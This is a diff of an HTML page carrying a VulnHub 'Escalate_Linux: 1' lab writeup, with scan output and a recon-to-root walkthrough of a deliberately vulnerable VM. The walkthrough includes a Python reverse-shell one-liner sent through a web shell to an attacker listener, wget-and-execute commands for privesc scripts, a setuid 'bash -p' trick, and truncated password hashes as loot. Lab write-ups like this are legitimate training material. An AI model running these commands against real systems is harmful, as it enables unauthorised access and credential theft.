@@ -27,16 +27,16 @@
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
     <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_escalatelinux/machinescli.png.webp" /></p>
+<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_escalatelinux/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
-<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_escalatelinux/killchain.png.webp" /></p>
+<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_escalatelinux/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
-<p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.29 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_creds">privesc_mysql_creds</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
+<p class="nested active">1. <code>80/tcp/http/Apache httpd 2.4.29 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_creds">privesc_mysql_creds</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Tue Sep 17 11:47:37 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/xml/_quick_tcp_nmap.xml 192.168.92.173
+<p class="nested active">1. Here's the Nmap scan result:  </p>
+<pre class="nested active"><code># Nmap 7.70 scan initiated Tue Sep 17 11:47:37 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/xml/_quick_tcp_nmap.xml 192.168.92.173
 Nmap scan report for 192.168.92.173
 Host is up, received arp-response (0.00026s latency).
 Scanned at 2019-09-17 11:47:38 PDT for 20s
@@ -112,10 +112,10 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Sep 17 11:47:58 2019 -- 1 IP address (1 host up) scanned in 21.30 seconds
 </code></pre>
-<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_escalatelinux/openports.png.webp" />  </p>
-<p class="nested">3. Found a <code>shell.php</code> file on <code>80/tcp</code> using <code>dirb</code>:  </p>
-<pre class="nested"><code>-----------------
+<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_escalatelinux/openports.png.webp" />  </p>
+<p class="nested active">3. Found a <code>shell.php</code> file on <code>80/tcp</code> using <code>dirb</code>:  </p>
+<pre class="nested active"><code>-----------------
 DIRB v2.22
 By The Dark Raver
 -----------------
@@ -145,7 +145,7 @@ DOWNLOADED: 27558 - FOUND: 4
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
 <h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>80/tcp     |  http         |  Apache httpd 2.4.29 ((Ubuntu))
+<pre class="nested active"><code>80/tcp     |  http         |  Apache httpd 2.4.29 ((Ubuntu))
 111/tcp    |  rpcbind      |  2-4 (RPC #100000)
 137/udp    |  netbios-ns   |  Samba nmbd netbios-ns (workgroup: WORKGROUP)
 139/tcp    |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
@@ -157,20 +157,20 @@ DOWNLOADED: 27558 - FOUND: 4
 59061/tcp  |  mountd       |  1-3 (RPC #100005)
 </code></pre>
 <h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
-<pre class="nested"><code>http://192.168.92.173:80/shell.php
+<pre class="nested active"><code>http://192.168.92.173:80/shell.php
 </code></pre>
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
-<pre class="nested"><code>ssh: root, mysql, user1, user2, user3, user4, user5, user6, user7, user8
+<pre class="nested active"><code>ssh: root, mysql, user1, user2, user3, user4, user5, user6, user7, user8
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. We set up a <code>netcat</code> listener and invoke a Python reverse shell:  </p>
-<pre class="nested"><code>nc -nlvp 9999
+<p class="nested active">1. We set up a <code>netcat</code> listener and invoke a Python reverse shell:  </p>
+<pre class="nested active"><code>nc -nlvp 9999
 http://192.168.92.173/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.92.163&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot01.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot02.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot01.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot02.png.webp" />  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>user6@osboxes&gt; id
+<pre class="nested active"><code>user6@osboxes&gt; id
 uid=1005(user6) gid=1005(user6) groups=1005(user6)
 user6@osboxes&gt;  
 user6@osboxes&gt; uname
@@ -199,36 +199,36 @@ user7
 user8
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
-<p class="nested">1. We start with downloading the privesc enumerations scripts:  </p>
-<pre class="nested"><code>wget http://192.168.92.163:8000/lse.sh ; chmod +x ./lse.sh ; ./lse.sh | tee lse.txt
+<p class="nested active">1. We start with downloading the privesc enumerations scripts:  </p>
+<pre class="nested active"><code>wget http://192.168.92.163:8000/lse.sh ; chmod +x ./lse.sh ; ./lse.sh | tee lse.txt
 wget http://192.168.92.163:8000/linenum.sh ; chmod +x ./linenum.sh ; ./linenum.sh | tee linenum.txt
 wget http://192.168.92.163:8000/linuxprivchecker.py ; chmod +x ./linuxprivchecker.py ; python ./linuxprivchecker.py | tee linuxprivchecker.txt
 </code></pre>
-<p class="nested">2. We also explore the <code>home</code> directories of users and find some inetresting files:  </p>
-<pre class="nested"><code>/home/user3/shell → setuid
+<p class="nested active">2. We also explore the <code>home</code> directories of users and find some inetresting files:  </p>
+<pre class="nested active"><code>/home/user3/shell → setuid
 /home/user4/abc.txt → owned by root
 /home/user5/script → setuid
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot03.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot04.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_escalatelinux/screenshot05.png.webp" />  </p>
-<p class="nested">3. From <code>linenum.sh</code> scan, we find that the MySQL service allows login with the default credentials <code>root/root</code>. We use this to connect and get credentials for the <code>mysql</code> user:  </p>
-<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot07.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot07a.png.webp" />  </p>
-<p class="nested">4. We investigate the <code>setuid</code> files now. Since the first <code>setuid</code> file <code>/home/user3/shell</code> is owned by <code>user3</code>, we checkout their <code>.bash_history</code> to see possible usage commands:  </p>
-<pre class="nested"><code>cat /home/user3/.bash_history
+<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot03.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot04.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_escalatelinux/screenshot05.png.webp" />  </p>
+<p class="nested active">3. From <code>linenum.sh</code> scan, we find that the MySQL service allows login with the default credentials <code>root/root</code>. We use this to connect and get credentials for the <code>mysql</code> user:  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot07.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot07a.png.webp" />  </p>
+<p class="nested active">4. We investigate the <code>setuid</code> files now. Since the first <code>setuid</code> file <code>/home/user3/shell</code> is owned by <code>user3</code>, we checkout their <code>.bash_history</code> to see possible usage commands:  </p>
+<pre class="nested active"><code>cat /home/user3/.bash_history
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot08.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot08a.png.webp" />  </p>
-<p class="nested">5. We find that the <code>/home/user3/shell</code> file requries a <code>.script.sh</code> file and needs it to have executable permissions. We create this file and test out the <code>shell</code> file which gives us an elevated shell:  </p>
-<pre class="nested"><code>echo -en &quot;bash -p&quot; &gt;&gt;./.script.sh
+<p class="nested active"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot08.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot08a.png.webp" />  </p>
+<p class="nested active">5. We find that the <code>/home/user3/shell</code> file requries a <code>.script.sh</code> file and needs it to have executable permissions. We create this file and test out the <code>shell</code> file which gives us an elevated shell:  </p>
+<pre class="nested active"><code>echo -en &quot;bash -p&quot; &gt;&gt;./.script.sh
 chmod +x ./.script.sh
 /home/user3/shell
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot09.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot09.png.webp" />  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM........................
+<pre class="nested active"><code>root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM........................
 user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2........................
 user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZ........................
 user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69a........................
@@ -240,11 +240,11 @@ user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOt
 user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20x........................
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<pre class="nested"><code>ssh: root/123..
+<pre class="nested active"><code>ssh: root/123..
 mysql: mysql/mysql@1....
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
+<ul class="nested active">
 <li><a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a>  </li>
 </ul>
     <hr>
